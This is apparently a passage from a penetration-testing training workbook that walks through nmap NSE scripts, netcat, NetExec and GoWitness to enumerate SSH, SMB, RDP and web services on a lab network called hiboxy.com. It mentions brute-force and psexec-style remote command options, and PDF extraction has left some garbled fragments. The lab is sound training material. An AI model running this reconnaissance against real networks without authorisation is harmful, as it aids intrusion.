#### Commands

wc -l /usr/share/nmap/scripts/script.db

#### Expected Results

sec560@560vm:~\$wc -l /usr/share/nmap/scripts/script.db 605 /usr/share/nmap/scripts/script.db

Let's count the number of scripts in some of the categories by sending the script.db file through the wc (word count) command with the -l (where that lowercase L stands for line count) option.

Look at the script.db file with grep. Identify the number of scripts in each of the following categories:

- safe •
- discovery •

intrusive •

```
Commands
 grep safe /usr/share/nmap/scripts/script.db | wc -l
 grep discovery /usr/share/nmap/scripts/script.db | wc -l
 grep intrusive /usr/share/nmap/scripts/script.db | wc -l
 Expected Results
   sec560@560vm:~$ grep safe /usr/share/nmap/scripts/script.db | wc -l
   348
   sec560@560vm:~$ grep discovery /usr/share/nmap/scripts/script.db | wc -l
   310
   sec560@560vm:~$ grep intrusive /usr/share/nmap/scripts/script.db | wc -l
   213
```

As you can see, there are 348 lines in the script.db file containing the word safe , 310 containing the word discovery , and 213 containing the word intrusive . These are good approximations for the number of scripts in each category. It isn't exact since our grep command isn't perfect and doesn't look for "category" (quotes), but for the sake of speed, this works fine. If you want to see the exact difference, compare the output of these two commands.

#### *6: The ssh-auth-methods Script*

The ssh-auth-methods script is used to identify the login methods available on an SSH server. Ideally, SSH servers only allow key based authentication and password authentication is disabled. We can check the hosts in the range to see the authentication methods allowed.

Run Nmap targeting the range using the script ssh-auth-methods. Let's just look at the .10 host.

sudo nmap-n --open -F --script =ssh-auth-methods 10.130.10.10

#### Expected Results

sec560@560vm:~\$ sudo nmap-n --open -F --script =ssh-auth-methods 10.130.10.10 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 23:22 UTC Nmap scan report for 10.130.10.10 Host is up (0.17s latency). Not shown: 96 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh | ssh-auth-methods: | Supported authentication methods: | publickey |\_ password 23/tcp open telnet 80/tcp open http 9100/tcp open jetdirect

Nmap done: 1 IP address (1 host up) scanned in 1.92 seconds

Notice the authentication methods found on port 22.

Also, note that Nmap says Telnet is running on this host. Let's take a quick look to con firm this Telnet is running. If it is, we need to document this cleartext protocol in our report. We should always con firm any findings before they go in our report. We'll use Netcat to con firm the service.

#### Command

nc -nv -w 1 10.130.10.10 23

#### Expected Results

sec560@560vm:~\$ nc -nv 10.130.10.10 23 (UNKNOWN) [10.130.10.10] 23 (telnet) open SSH-2.0-OpenSSH\_9.6p1 Ubuntu-3ubuntu13.14

Press CTRL+C to quit Netcat.

Notice the banner sent back on port 23. It says it is SSH. Looking back at our earlier Nmap scan, Nmap said this service is Telnet. This is because Nmap didn't interact with the service beyond identifying the open port. Nmap assumed the service was Telnet based solely on the port number.

Since Nmap identified this service as Telnet, it also didn't run the ssh-auth-methods script against this service. Let's take a look at how the ssh-auth-methods script works.

#### *7: Examining the ssh-auth-methods Script*

The ssh-auth-methods.nse script identi fies the authentication allowed by an SSH server. Ideally, the server uses only key based authentication, and not passwords.

Nmap didn't check the authentication methods on port 23, because Nmap didn't know it was actually SSH running on a nonstandard port.

Let's run use the ssh-auth-methods script again, but this time we'll do service detection ( -sV ).

```
sudo nmap-n --open -F --script =ssh-auth-methods 10.130.10.10 -sV
```

#### Expected Results

```
sec560@560vm:~$ sudo nmap-n --open -F --script =ssh-auth-methods 10.130.10.10 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 23:28 UTC
Nmap scan report for 10.130.10.10
Host is up (0.16s latency).
Not shown: 96 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-auth-methods: 
| Supported authentication methods: 
| publickey
|_ password
23/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-auth-methods: 
| Supported authentication methods: 
| publickey
|_ password
80/tcp open http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
9100/tcp open jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/
```

We see that this time Nmap correctly identified port 23 as SSH, thanks to the version scanning with -sV . This then triggers our script, and we see the authentication methods for SSH on port 23.

So what is the point of this component of this lab?

Nmap's scripts without a version scan may miss important services listening on nonstandard ports. Thus, when running a script from within Nmap, you are likely better served by making sure that you run a version scan ( -sV ) along with the script invocation ( -sC or --script ).

These are important lessons for penetration testers who want to make the most out of NSE functionality.

Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds

#### *8: SMB Scripts*

submit/ .

Next, let's look at the Server Message Block (SMB) scripts included with Nmap, many of which were written by Ron Bowes. First, we'll look at the name of all the SMB NSE scripts included with this version of Nmap:

ls /usr/share/nmap/scripts/smb\*.nse

#### Expected Results

sec560@560vm:~\$ ls -1 /usr/share/nmap/scripts/smb\*.nse /usr/share/nmap/scripts/smb2-capabilities.nse /usr/share/nmap/scripts/smb2-security-mode.nse /usr/share/nmap/scripts/smb2-time.nse /usr/share/nmap/scripts/smb2-vuln-uptime.nse /usr/share/nmap/scripts/smb-brute.nse /usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse /usr/share/nmap/scripts/smb-enum-domains.nse /usr/share/nmap/scripts/smb-enum-groups.nse /usr/share/nmap/scripts/smb-enum-processes.nse /usr/share/nmap/scripts/smb-enum-services.nse /usr/share/nmap/scripts/smb-enum-sessions.nse /usr/share/nmap/scripts/smb-enum-shares.nse /usr/share/nmap/scripts/smb-enum-users.nse /usr/share/nmap/scripts/smb-flood.nse /usr/share/nmap/scripts/smb-ls.nse ... truncated for brevity ...

Here you can see scripts that let us perform brute force password guessing ( smb-brute.nse), check for common vulnerabilities ( smb-vuln-\* ), and plunder the target for information (smb-enum-domains, groups, processes, and more).

Nmap uses "dependencies" to determine in what order to run NSE scripts. When NSE scripts run, they can save their results to a *register*. There is a global registry ( nmap.registry ), and a per host registry ( host.registry ). For the SMB scripts, many of them list smb-brute as a dependency, which means it should run first. The scripts that depend on smb-brute *require* authentication to work. Let's see which require authentication with grep . The -l option will only show the files that contain the search term:

grep -l smb-brute /usr/share/nmap/scripts/smb\*

#### Expected Results

sec560@560vm:~\$ grep -l smb-brute /usr/share/nmap/scripts/smb\* /usr/share/nmap/scripts/smb-brute.nse /usr/share/nmap/scripts/smb-enum-domains.nse /usr/share/nmap/scripts/smb-enum-groups.nse /usr/share/nmap/scripts/smb-enum-processes.nse /usr/share/nmap/scripts/smb-enum-sessions.nse /usr/share/nmap/scripts/smb-enum-shares.nse /usr/share/nmap/scripts/smb-enum-users.nse /usr/share/nmap/scripts/smb-flood.nse /usr/share/nmap/scripts/smb-os-discovery.nse /usr/share/nmap/scripts/smb-psexec.nse /usr/share/nmap/scripts/smb-security-mode.nse /usr/share/nmap/scripts/smb-server-stats.nse /usr/share/nmap/scripts/smb-system-info.nse /usr/share/nmap/scripts/smb-vuln-conficker.nse /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse /usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse /usr/share/nmap/scripts/smb-vuln-ms06-025.nse /usr/share/nmap/scripts/smb-vuln-ms07-029.nse /usr/share/nmap/scripts/smb-vuln-ms08-067.nse /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse

To see the scripts that *don't* depend on smb-brute, use -L .

grep -L smb-brute /usr/share/nmap/scripts/smb\*

#### Expected Results

sec560@560vm:~\$ grep -L smb-brute /usr/share/nmap/scripts/smb\* /usr/share/nmap/scripts/smb2-capabilities.nse /usr/share/nmap/scripts/smb2-security-mode.nse /usr/share/nmap/scripts/smb2-time.nse /usr/share/nmap/scripts/smb2-vuln-uptime.nse /usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse /usr/share/nmap/scripts/smb-enum-services.nse /usr/share/nmap/scripts/smb-ls.nse /usr/share/nmap/scripts/smb-mbenum.nse /usr/share/nmap/scripts/smb-print-text.nse /usr/share/nmap/scripts/smb-protocols.nse /usr/share/nmap/scripts/smb-vuln-ms10-054.nse /usr/share/nmap/scripts/smb-vuln-ms10-061.nse /usr/share/nmap/scripts/smb-vuln-ms17-010.nse /usr/share/nmap/scripts/smb-vuln-webexec.nse /usr/share/nmap/scripts/smb-webexec-exploit.nse

Just because a script doesn't list smb-brute.nse as a dependency doesn't mean it doesn't depend on it, though. For instance, smb-ls.nse lists smb-enum-shares as a dependency, and smb-enum-shares depends on smb-brute. So, to get the most out of NSE scripts, it's helpful to know the requirements of the various scripts. For the SMB scripts, most need valid credentials, which can be provided with --script-args . For example, the smb-psexec script allows us to provide a username and password in the administrators group as well as one or more commands we want to run in a con figuration file, and this script will attempt to cause any targets that it discovers communicating using SMB to run the commands. It operates in a fashion similar to the Microsoft Sysinternals' PsExec.exe. The Nmap option looks like this:

#### Command Line Option

--script-args=smbuser=ADMIN\_USER,smbpass=ADMIN\_PASSWORD,config=CONFIG\_FILE\_NAME

Unauthenticated scans aren't the only limitation of many of the SMB NSE scripts, as we'll see in a just a moment.

#### *9: The smb2-security-mode Script*

Since we rarely have credentials at this stage of a penetration test, let's take a look at some of the SMB NSE scripts that *don't* require authentication. The smb2-security-mode.nse script "determines the message signing configuration in SMBv2 servers for all supported dialects." We'll discuss the implications of this setting later in this course, but the more secure option is to require SMB signing. Requiring SMB signing helps to prevent SMB relay attacks.

Let's look at this configuration of the targets in our environment.

![](SEC560_WorkBook1_page_82_Figure_3.jpeg)

10.130.10.4 has the more secure configuration that requires signing. The .5 system does not require signing. This would be a

later in the course.

#### *10: The smb-protocols Script*

In the past few years we've seen a number of attacks against the SMBv1 protocol. The most notable was the EternalBlue exploits in 2017. The SMBv1 protocol should be disabled across the network. Let's use this script check if any systems are running this protocol. For the sake of speed, let's look just at the 10.130.10.4, and 10.130.10.44 systems.

### Command sudo nmap-n -PS445 -p 445 --open --script =smb-protocols 10.130.10.4,44 Expected Results sec560@560vm:~\$ sudo nmap-n -PS445 -p 445 --open --script =smb-protocols 10.130.10.4,44 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-12 01:33 UTC Nmap scan report for 10.130.10.4 Host is up (0.031s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-protocols: | dialects: | 2:0:2 | 2:1:0 | 3:0:0 | 3:0:2 |\_ 3:1:1 Nmap scan report for 10.130.10.44 Host is up (0.027s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-protocols: | dialects: | NT LM 0.12 (SMBv1) [dangerous, but default] | 2:0:2 | 2:1:0 | 3:0:0 | 3:0:2 |\_ 3:1:1 Nmap done: 2 IP addresses (2 hosts up) scanned in 12.92 seconds

Notice that the 10.130.10.44 system has SMBv1 enabled. This would be written up as a finding in your final report. Let's look more into this system to determine more of the risk.

#### *11: OS Fingerprinting*

It's helpful to know what OS we're targeting when we start thinking about attacks beyond port scanning, like password guessing or exploitation. We'll learn later that exploits tend to target speci fic versions of specific operating systems. And even if we're targeting an application that can run on multiple operating systems, we have to pick a payload compatible with the host OS. Nmap has an OS fingerprinting feature, which we can use with the -O parameter. Unfortunately, as you'll soon see, it's not very accurate. Let's try it against these 10.130.10.4, 10.130.10.10, and 10.130.10.44.

![](SEC560_WorkBook1_page_85_Figure_0.jpeg)

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -F -O 10.130.10.4,10,44 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-12 16:30 UTC Nmap scan report for 10.130.10.4 Host is up (0.028s latency). Not shown: 93 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Nmap scan report for 10.130.10.10 Host is up (0.027s latency). Not shown: 96 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 23/tcp open telnet 80/tcp open http 9100/tcp open jetdirect No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/ submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=9/12%OT=22%CT=7%CU=42601%PV=Y%DS=2%DC=I%G=Y%TM=68C4 OS:4ABE%P=x86\_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(S OS:P=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW OS:7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=F4B3% OS:W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M551N OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R= OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%D OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4 OS:0%CD=S) Network Distance: 2 hops Nmap scan report for 10.130.10.44 Host is up (0.032s latency). Not shown: 96 filtered tcp ports (no-response) PORT STATE SERVICE 135/tcp open msrpc

139/tcp open netbios-ssn

445/tcp open microsoft-ds

3389/tcp open ms-wbt-server

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 3 IP addresses (3 hosts up) scanned in 14.47 seconds

You can see that Nmap couldn't detect the OS for any of the hosts. Nmap's OS fingerprinting sends a series of crafted TCP, UDP, and ICMP probes to a target and records subtle differences in responses. It then compares these response patterns against /usr/share/nmap/nmap-os-db to *infer* the most likely operating system and version.

For hosts 10.130.10.4 and 10.130.10.44, Nmap says, "OSScan results may be unreliable because we could not find at least 1 open and 1 closed port". For .10, Nmap says "No exact OS matches" and provides a fingerprint you can submit to the project if you know the remote OS.

Looking back, the version scans gave us more information, but it was still pretty broad, Linux or Windows. If we want more information on a Windows system, we can use the smb-os-discovery.nse script. Let's run this against the hosts in our target network and look at the results. Let's try it against 10.130.10.4 and 10.130.10.44.

sudo nmap-n -p 445 --open --script =smb-os-discovery.nse 10.130.10.4,44

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -p 445 --open --script =smb-os-discovery.nse 10.130.10.4,44 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-12 05:47 UTC Nmap scan report for 10.130.10.4 Host is up (0.035s latency).

PORT STATE SERVICE 445/tcp open microsoft-ds

Nmap scan report for 10.130.10.44 Host is up (0.035s latency).

PORT STATE SERVICE 445/tcp open microsoft-ds

#### Host script results:

| smb-os-discovery:

| OS: Windows Server 2022 Datacenter 20348 (Windows Server 2022 Datacenter 6.3)

| Computer name: file01

| NetBIOS computer name: FILE01\x00

| Domain name: hiboxy.com

| Forest name: hiboxy.com

| FQDN: file01.hiboxy.com

|\_ System time: 2025-09-12T05:47:53+00:00

Nmap done: 2 IP addresses (2 hosts up) scanned in 3.56 seconds

The script detects that 10.130.10.44 is running Window Server 2022 Datacenter 20348, the hostname of 10.130.10.44 is file01 , and the domain is hiboxy.com. This is useful information that we may need later in our pen test! We didn't get any results for 10.130.10.4, though. Let's add Nmap's debug option ( -d ) to the end of the command to figure out why.

sudo nmap-n -p 445 --open --script =smb-os-discovery.nse 10.130.10.4,44 -d

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -p 445 --open --script =smb-os-discovery.nse 10.130.10.4,44 -d

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-12 05:56 UTC

... truncated for brevity ...

Completed SYN Stealth Scan at 05:56, 0.03s elapsed (2 total ports)

Overall sending rates: 57.26 packets / s, 2519.54 bytes / s.

NSE: Script scanning 2 hosts.

NSE: Starting runlevel 1 (of 1) scan.

Initiating NSE at 05:56

NSE: Starting smb-os-discovery against 10.130.10.4.

NSE: Starting smb-os-discovery against 10.130.10.44.

NSE: [smb-os-discovery 10.130.10.4] SMB: Added account '' to account list

NSE: [smb-os-discovery 10.130.10.4] SMB: Added account 'guest' to account list

NSE: [smb-os-discovery 10.130.10.4] Couldn't negotiate a SMBv1 connection:SMB: Failed to receive bytes: ERROR

NSE: Finished smb-os-discovery against 10.130.10.4.

NSE: [smb-os-discovery 10.130.10.44] SMB: Added account '' to account list

NSE: [smb-os-discovery 10.130.10.44] SMB: Added account 'guest' to account list

NSE: [smb-os-discovery 10.130.10.44] SMB: Login as \guest failed

(NT\_STATUS\_ACCOUNT\_DISABLED)

NSE: Finished smb-os-discovery against 10.130.10.44.

Completed NSE at 05:56, 3.38s elapsed

... truncated for brevity ...

In the debug output, we can see that Nmap "Couldn't negotiate an SMBv1 connection" with 10.130.10.4. For 10.130.10.44, it created an SMBv1 connection, but it failed to authenticate. The authentication attempt is all that's needed to gather a remote Windows system's details. If you were to use -d with the rest of the SMB script, you'd see many of them fail to run for the same reason. Recall from the smb-protocols.nse script in step 10 that 10.130.10.44 was the *only* system running SMBv1. So, while the SMB scripts look useful, many don't work without SMBv1, which was disabled by default starting with Windows 10 and Windows Server 2016. We still see SMBv1, but we shouldn't count on it being enabled to aid in OS detection.

Lets look at some better means of fingerprinting Windows.

#### *12: Better OS Fingerprinting Techniques*

While Nmap's OS Detection feature doesn't provide us much useful information, we have other options. Recall in Step 4 where we were able to manually determine the distribution version of Ubuntu by analyzing nginx and SSH software version. There are NSE scripts to gather information from protocols that perform NTLMv1 and NTLMv2 authentication from Windows that can help us do this manually, as well.

#### \*ntlm-info NSE Scripts

sec560@560vm:~\$ ls -1 /usr/share/nmap/scripts/\*ntlm\* /usr/share/nmap/scripts/http-ntlm-info.nse /usr/share/nmap/scripts/imap-ntlm-info.nse /usr/share/nmap/scripts/ms-sql-ntlm-info.nse /usr/share/nmap/scripts/nntp-ntlm-info.nse /usr/share/nmap/scripts/pop3-ntlm-info.nse /usr/share/nmap/scripts/rdp-ntlm-info.nse /usr/share/nmap/scripts/smtp-ntlm-info.nse /usr/share/nmap/scripts/telnet-ntlm-info.nse

Let's scan try using rdp-ntlm-info against 10.130.10.4 and 10.130.10.44 to see if we get useful information.

sudo nmap-n -PS3389 -p 3389 --open 10.130.10.4,44 --script rdp-ntlm-info

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -PS3389 -p 3389 --open 10.130.10.4,44 --script rdp-ntlm-info Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-12 17:31 UTC Nmap scan report for 10.130.10.4 Host is up (0.033s latency).

PORT STATE SERVICE 3389/tcp open ms-wbt-server

| rdp-ntlm-info:

| Target\_Name: HIBOXY

| NetBIOS\_Domain\_Name: HIBOXY | NetBIOS\_Computer\_Name: DC01 | DNS\_Domain\_Name: hiboxy.com

| DNS\_Computer\_Name: dc01.hiboxy.com

| DNS\_Tree\_Name: hiboxy.com

| Product\_Version: 10.0.20348

|\_ System\_Time: 2025-09-12T17:31:13+00:00

Nmap scan report for 10.130.10.44 Host is up (0.035s latency).

PORT STATE SERVICE 3389/tcp open ms-wbt-server

| rdp-ntlm-info:

| Target\_Name: HIBOXY

| NetBIOS\_Domain\_Name: HIBOXY | NetBIOS\_Computer\_Name: FILE01 | DNS\_Domain\_Name: hiboxy.com

| DNS\_Computer\_Name: file01.hiboxy.com

| DNS\_Tree\_Name: hiboxy.com | Product\_Version: 10.0.20348

|\_ System\_Time: 2025-09-12T17:31:13+00:00

Nmap done: 2 IP addresses (2 hosts up) scanned in 0.33 seconds

You can see the rdp-ntlm-info output looks similar to smb-os-discovery, but it doesn't have an "OS" field in the output. Instead, there is a "Product\_Version" field, which can be used to look up the "Latest build" of the system here. Using 20348 and referencing the Windows Server Release Info page shows us it is Windows Server 2022 Datacenter, Standard.

There are other tools that do a great job of identifying Windows versions, too. One example is NetExec. You used it in Lab 1.1 to do a password spray against 10.130.10.23 . What you may not have noticed is how well it identifies and displays the OS version of its targets. Let's create a quick list of systems listening on port 445.

![](SEC560_WorkBook1_page_92_Figure_2.jpeg)

Now, let's use that list as input to NetExec to detect the Windows versions of system.

nxc smb 445.tcp

#### Expected Results

```
sec560@560vm:~$ nxc smb 445.tcp
SMB 10.130.10.4 445 DC01 [*] Windows Server 2022 Build 20348 
x64 (name:DC01) (domain:hiboxy.com) (signing:True) (SMBv1:False) (Null Auth:True)
SMB 10.130.10.7 445 CA01 [*] Windows Server 2022 Build 20348 
x64 (name:CA01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB 10.130.10.44 445 FILE01 [*] Windows Server 2022 Build 20348 
x64 (name:FILE01) (domain:hiboxy.com) (signing:False) (SMBv1:True)
SMB 10.130.10.21 445 JUMP01 [*] Windows Server 2022 Build 20348 
x64 (name:JUMP01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB 10.130.10.23 445 RDP01 [*] Windows Server 2022 Build 20348 
x64 (name:RDP01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB 10.130.10.25 445 MAIL01 [*] Windows Server 2022 Build 20348 
x64 (name:MAIL01) (domain:hiboxy.com) (signing:True) (SMBv1:False)
SMB 10.130.10.5 445 WEB01 [*] Windows Server 2022 Build 20348 
(name:WEB01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
Running nxc against 7 targets 100% 0:00:00 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

Not only do we get the full Windows version and build number, but it also identified SMB signing and SMBv1 vulnerabilities! NetExec can do similar with RDP, MS SQL, SSH, and other protocols.

#### *13: HTTP NSE Scripts*

HTTP and HTTPS are two of the most common protocols on the planet. They are also the protocols most likely to be running on non-standard ports. So, finding all fo the HTTP/S services in an environment can be tricky. Thankfully, Nmap allows us to scan ports using the service names defined in its nmap-services file. You can use wildcards to match multiple entries—for example, p\*http\* tells Nmap to look up all services in the file whose names contain "http", and then scan those ports. This makes it easy to target groups of related services without needing to remember or manually enter each port number. Let's see what ports that would scan:

# Command sudo nmap-v -p\*http\* -oG - Expected Results sec560@560vm:~\$ sudo nmap-v -p\*http\* -oG - # Nmap 7 .94SVN scan initiated Fri Sep 12 18:41:26 2025 as: nmap -v -p\*http\* -oG - # Ports scanned: TCP(63;80,

280,443,488,591,593,623,777,808,832,1183-1184,2381,2688,2851,3106,3128,3227,3816,4035-4036,4180,4848-4849,5554

UDP(0;) SCTP(0;) PROTOCOLS(0;) WARNING: No targets were specified, so 0 hosts scanned.

# Nmapdone at Fri Sep 12 18:41:26 2025 -- 0 IP addresses (0 hosts up) scannedin 0 .03 seconds

Nmap produced a list of 63 target ports! Let's see how many services we can find!

### Command sudo nmap-n -p\*http\* --open 10.130.10.0/24 --script reverse-index --max-retries 0 Expected Results sec560@560vm:~\$ sudo nmap-n -p\*http\* --open 10.130.10.0/24 --script reverse-index --max-retries 0 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-12 18:55 UTC Warning: 10.130.10.1 giving up on port because retransmission cap hit (0). Warning: 10.130.10.2 giving up on port because retransmission cap hit (0). Warning: 10.130.10.3 giving up on port because retransmission cap hit (0). Warning: 10.130.10.8 giving up on port because retransmission cap hit (0). Warning: 10.130.10.9 giving up on port because retransmission cap hit (0). Warning: 10.130.10.13 giving up on port because retransmission cap hit (0). ... truncated for brevity ... Nmap scan report for 10.130.10.25 Host is up (0.029s latency). Not shown: 58 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 80/tcp open http 443/tcp open https 593/tcp open http-rpc-epmap 808/tcp open ccproxy-http 8080/tcp open http-proxy Post-scan script results: | reverse-index: | 80/tcp: 10.130.10.5, 10.130.10.6, 10.130.10.10, 10.130.10.11, 10.130.10.25

```
| 443/tcp: 10.130.10.25
| 593/tcp: 10.130.10.4, 10.130.10.25
| 808/tcp: 10.130.10.25
|_ 8080/tcp: 10.130.10.25
Nmap done: 256 IP addresses (13 hosts up) scanned in 3.19 seconds
```

The reverse-index script makes it easier to see "all hosts with HTTP" or "all hosts with SSH" across a subnet, instead of digging through each host's section. This is especially useful for follow-up scans, where you want to focus only on certain services (like HTTP on 80/443). Specifying --max-retries 0 speeds up the scan a little by disabling the probe retransmissions.

There are over 130 HTTP related Nmap scripts. We're going to look at a four that can be very helpful.

- http-headers : Retrieves and displays the HTTP response headers from a web server.
- http-methods: Enumerates which HTTP methods (GET, POST, PUT, DELETE, etc.) are allowed.
- http-robots.txt : Grabs the contents of a site's robots.txt file.
- http-auth-finder : Detects web resources that require authentication.

| Since we saw that 80 and 443 were by far the most common, let's run these scripts against those ports and save the output. |  |  |  |  |
|----------------------------------------------------------------------------------------------------------------------------|--|--|--|--|
| We'll use the Nmap XML file in the next section of the lab.                                                                |  |  |  |  |
|                                                                                                                            |  |  |  |  |
|                                                                                                                            |  |  |  |  |
|                                                                                                                            |  |  |  |  |
|                                                                                                                            |  |  |  |  |
|                                                                                                                            |  |  |  |  |
|                                                                                                                            |  |  |  |  |

![](SEC560_WorkBook1_page_97_Figure_0.jpeg)

```
If you don't see the http-auth-finder result, try scanning again.
Expected Results
 sec560@560vm:~$ sudo nmap 10.130.10.0/24 -n -p80,443 -PS80,443 --script http-headers,http-
 methods,http-robots.txt,http-auth-finder -oA /tmp/webservers
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-12 19:06 UTC
 Nmap scan report for 10.130.10.5
 Host is up (0.029s latency).
 ... truncated for brevity ...
 PORT STATE SERVICE
 80/tcp open http
 | http-headers: 
 | Server: Microsoft-IIS/10.0
 | Date: Fri, 12 Sep 2025 19:06:11 GMT
 | Connection: close
 | Content-Length: 0
 | 
 |_ (Request type: GET)
 443/tcp open https
 | http-methods: 
 |_ Supported Methods: GET HEAD POST OPTIONS
 | http-auth-finder: 
 | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.130.10.25
 | 
 url 
 method
 |_ https://10.130.10.25:443/owa/auth/logon.aspx?
 url=https%3A%2F%2F10.130.10.25%2Fowa%2F&reason=0 FORM
 | http-headers: 
 | Cache-Control: no-cache, no-store
 | Pragma: no-cache
 | Content-Type: text/html; charset=utf-8
 | Expires: -1
 | Server: Microsoft-IIS/10.0
 | request-id: 0c66fa1b-c438-4135-be01-93de5cea9b80
 | X-Frame-Options: SAMEORIGIN
 | X-AspNet-Version: 4.0.30319
 | X-Powered-By: ASP.NET
 | Date: Fri, 12 Sep 2025 19:06:11 GMT
 | Connection: close
 | Content-Length: 58712
 | 
 |_ (Request type: GET)
 Nmap done: 256 IP addresses (6 hosts up) scanned in 5.49 seconds
    If your output is missing http-auth-finder results...
```

We can see from the script output that it identified an auth page that appears to be Outlook Web Access! Nothing jumped out from the other scans, so this is the part where we'd visit each site individually. Since that can be quite time consuming, let use GoWitness to expedite the process!

#### *14: GoWitness*

In the last step, we used -oA to save our HTTP scan. We could use -oX to just save the XML format, but we may as well save all the versions using -oA . Remember, drive space is cheaper than your time, and big scans can take a lot of time.

Let's create a folder for this scan and feed the Nmap XML file GoWitness.

#### Command

mkdir gowitness&& cd gowitness

This command has no output.

gowitness scan nmap -f /tmp/webservers.xml --write-db -s screenshots

#### Expected Results

sec560@560vm:~/gowitness\$ gowitness scan nmap-f /tmp/webservers.xml --write-db -s screenshots 2025/09/12 19:24:39 INFO result target=http://10.130.10.6:80 status-code=200 title="IIS Windows Server" have-screenshot=true 2025/09/12 19:24:41 INFO result target=http://10.130.10.5:80 status-code=200 title="" have-screenshot=true 2025/09/12 19:24:44 INFO result target=http://10.130.10.10:80 status-code=200 title="Welcome to nginx!" have-screenshot=true 2025/09/12 19:24:50 INFO result target=http://10.130.10.11:80 status-code=200 title="Welcome to nginx!" have-screenshot=true 2025/09/12 19:25:04 INFO result target=https://10.130.10.25:443 status-code=200

#### Command Breakdown

- gowitness: Tool for capturing web screenshots and metadata. •
- scan: Instructs GoWitness to run a scan, instead of generating a report. •
- nmap: Tells gowitness to parse Nmap XML output. •

title=Outlook have-screenshot=true

- -f /tmp/webservers.xml : Input file, the Nmap scan results in XML format. •
- --write-db : Saves discovered hosts and scan data into gowitness's SQLite database. •
- -s screenshots : Directory to save captured screenshots of web services. •

Staying in the ~/gowitness/ directory, let's start the report server and take a look at the results.

#### Command

gowitness report server

#### Expected Results

sec560@560vm:~/gowitness\$ gowitness report server 2025/09/12 19:31:39 INFO starting web server host=127.0.0.1 port=7171

Leaving that terminal running, open a new browser tab and browse to http://127.0.0.1:7171/ .

The first page you'll see is the GoWitness Dashboard. It's more interesting with larger scans. For now, let's look at the Gallery of sites it scanned. Towards the top of the window, click the "Gallery" button.

![](SEC560_WorkBook1_page_101_Figure_1.jpeg)

The gallery displays a thumbnail for each of the sites GoWitness scanned. We can quickly look through the results for anything interesting. Let's start by looking at the results for 10.130.10.5:80 , which is the Hiboxy website.

![](SEC560_WorkBook1_page_102_Figure_0.jpeg)

On the Hiboxy site results page, take a moment and review the information in the Network Log, Console Log, and Request Headers. Then use the "Next" button in the upper left to browse through the other results.

![](SEC560_WorkBook1_page_103_Figure_0.jpeg)

